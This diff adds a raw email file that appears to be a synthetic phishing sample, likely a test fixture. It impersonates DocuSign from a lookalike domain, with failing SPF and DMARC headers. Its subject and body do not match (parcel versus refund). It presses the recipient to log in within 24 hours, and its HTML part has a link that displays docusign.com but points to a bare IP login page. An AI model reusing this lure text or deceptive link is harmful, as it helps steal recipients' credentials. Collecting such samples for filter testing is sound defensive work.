@@ -1,0 +1,66 @@
+From: "DocuSign" <notice@docusign-review.click>
+To: Ananya Grant <ananya.grant@brightpath-edu.ac.in>
+Subject: Your parcel AWB600064665 could not be delivered - reschedule now
+Date: Sat, 02 May 2026 09:30:00 +0000
+Message-ID: <178772094058.6.8536014662310475613@docusign-review.click>
+Return-Path: <bounce-9095@docusign-review.click>
+MIME-Version: 1.0
+X-Mailer: smtplib/3.9
+Received: from mx1.mail-relay.example (mx1.mail-relay.example [192.0.2.10]) by
+ mx.brightpath-edu.ac.in (Postfix) with ESMTPS id E88ADEF2FBD0 for
+ <recipient@brightpath-edu.ac.in>; Sat, 02 May 2026 09:30:00 +0000
+Received: from mail.gateway.example (mail.gateway.example [203.0.113.5]) by
+ mx1.mail-relay.example (Postfix) with ESMTPS id 274F48AA2B80; Sat, 02 May
+ 2026 09:26:50 +0000
+Received: from edge-2.mailcluster.example (edge-2.mailcluster.example
+ [203.0.113.61]) by mail.gateway.example (Postfix) with ESMTPS id
+ 5CBB59FEFE8F; Sat, 02 May 2026 09:22:25 +0000
+Received: from smtp-out-3.example (smtp-out-3.example [192.0.2.44]) by
+ edge-2.mailcluster.example (Postfix) with ESMTPS id 48EAB941DA3B; Sat, 02 May
+ 2026 09:16:57 +0000
+Received: from vps-31.hosting.example (vps-31.hosting.example [198.51.100.7])
+ by smtp-out-3.example (Postfix) with ESMTPS id 491DF00A9382; Sat, 02 May 2026
+ 09:15:04 +0000
+Received-SPF: fail (mailfrom) identity=mailfrom; client-ip=203.0.113.61;
+ envelope-from=<bounce@docusign-review.click>;
+Authentication-Results: mx.docusign-review.click; spf=fail
+ smtp.mailfrom=docusign-review.click; dkim=none
+ header.d=docusign-review.click; dmarc=fail (p=reject)
+ header.from=docusign-review.click
+Content-Type: multipart/alternative;
+ boundary="===============3368371747939380751=="
+
+--===============3368371747939380751==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Dear customer,
+
+A refund has been approved against your assessment and is awaiting your bank =
+confirmation. Reference number: AWB600064665.
+
+Click here to log in and complete the process:
+https://docusign-review.click/login
+
+If we do not receive a response within 24 hours the request will be cancelled=
+ and
+the amount returned to treasury.
+
+Customer Support
+DocuSign
+
+--===============3368371747939380751==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body style=3D"font-family:Segoe UI,Arial,sans-serif;font-size:14px;col=
+or:#202124"><p>Dear customer,</p><p>A refund has been approved against your a=
+ssessment and is awaiting your bank confirmation. Reference number: AWB600064=
+665.</p><p>Click here to log in and complete the process: https://docusign-re=
+view.click/login</p><p>If we do not receive a response within 24 hours the re=
+quest will be cancelled and the amount returned to treasury.</p><p>Customer S=
+upport DocuSign</p><p><a href=3D"http://203.0.113.99/login">https://www.docus=
+ign.com/verify</a></p></body></html>
+
+--===============3368371747939380751==--
